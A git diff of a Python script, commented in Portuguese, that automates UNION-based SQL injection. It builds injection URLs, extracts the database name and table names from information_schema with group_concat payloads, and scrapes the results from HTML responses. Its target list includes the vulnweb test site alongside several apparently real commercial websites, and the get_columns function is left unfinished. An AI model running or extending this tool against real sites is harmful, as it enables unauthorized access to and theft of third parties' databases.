@@ -4,9 +4,11 @@ from icecream import ic
 
 WORD = "yasmim"
 DATABASE = "database()"
+TABLE_QUERY = "group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema="
+COLUMNS_QUERY = "group_concat(column_name)%20from%20information_schema.columns%20where%20table_name="
 
 url_global = None
-url_global = "http://www.bancocn.com/cat.php?id=1"
+#url_global = "http://www.bancocn.com/cat.php?id=1"
 #url_global = "https://minasca.com.br/single-produtos.php?id=1"
 #url_global = "http://www.promix.com.br/produtos/categoria.php?cat=1"
 #url_global = "http://testphp.vulnweb.com/listproducts.php?cat=1"
@@ -58,6 +60,7 @@ def columns_order_by():
     union_select_url = f"-1%20union%20select%20{clean_select}"
     return union_select_url
 
+## FUNCAO QUE CRIA A URL -- SEM O INJECTION -- 
 def url_maker():
     url = url_global
     last_equal_index = url.rfind("=")
@@ -70,11 +73,9 @@ def url_maker():
 ## FUNCAO QUE PEGAR O HTML CONTENT INTEIRO DO INJECTION
 def get_response_query():
     
-    url_global = f"http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,'{WORD}'"
-    #URL = f"https://minasca.com.br/single-produtos.php?id=1%27union%20select%201,'{WORD}',3%20--%20%27"
-    #URL = f"http://www.promix.com.br/produtos/categoria.php?cat=-1%20union%20select%201,2,'{WORD}'"
+    url = url_maker() + f"'{WORD}'"
     
-    response = requests.get(url_global)
+    response = requests.get(url)
     if response.status_code == 200:
             request_content = response.content 
             request_content_len = len(request_content)
@@ -108,11 +109,9 @@ def trash_content():
 
 ## FUNCAO QUE INJETA O DATABASE() E RETORNA O HTML CONTENT INTEIRO DO INJECTION
 def get_database():
-    URL = f"http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,{DATABASE}"
-    #URL = f"https://minasca.com.br/single-produtos.php?id=1%27union%20select%201,{DATABASE},3%20--%20%27"
-    #URL = f"http://www.promix.com.br/produtos/categoria.php?cat=-1%20union%20select%201,2,{DATABASE}"
     
-    response = requests.get(URL)
+    url = url_maker() + f"{DATABASE}"
+    response = requests.get(url)
     if response.status_code == 200:
             request_content = response.content 
             request_content_len = len(request_content)
@@ -136,18 +135,45 @@ def clean_database():
         dbname = dbname.replace(content, '')
     return dbname
 
+def get_tables():
+    
+    url = url_maker()
+    url = url + TABLE_QUERY + f"'{clean_database()}'"
+    response = requests.get(url)
+    if response.status_code == 200:
+            request_content = response.content 
+            request_content_len = len(request_content)
+            request_content = request_content.decode('utf-8', errors='ignore') # Decodificar os bytes para uma string UTF-8
+
+    dirty_table = request_content.splitlines()
+    if 1 <= find_line() <= len(dirty_table):
+        dirty_table = dirty_table[find_line() - 1]
+        
+    tbname = dirty_table
+    for content in trash_content():
+        tbname = tbname.replace(content, '')
+    tbnames = tbname.split(",")
+    tbnames = " ".join(tbnames)
+    return tbnames
+
+def get_columns():
+    url = url_maker
+   
+    
+    
+## ----------*  FUNCTION CALLS *----------
 
 
 
-#url()
+url()
 
 #reflected_column = order_by() ## --> RETORNA A QUANTIDADE DE TABLES
 #print(reflected_column)
 
-#union_select = columns_order_by() ## RETORNA A STRING COM A COLUNA VULNERAVEL
+#union_select = columns_order_by() ## --> RETORNA A STRING COM A COLUNA VULNERAVEL
 #print (union_select)
 
-#url_injectable = url_maker()
+#url_injectable = url_maker() ## --> RETORNA A URL SEM O INJECTION
 #print (url_injectable)
 
 #html_word_content = get_response_query()  ## --> RETORNA HTML INTEIRO COM A "WORD"
@@ -168,6 +194,7 @@ def clean_database():
 #dirty_database = find_database() ## --> RETORNA O "DATABASE()" SUJO
 #print (f"Database sujo: {dirty_database}")
 
-dbname = clean_database() ## --> RETORNA O DBNAME JA TRATADO
-print (f"Database limpo: {dbname}")
+#dbname = clean_database() ## --> RETORNA O DBNAME JA TRATADO
+#print (f"Database limpo: {dbname}")
 
+print(get_tables())
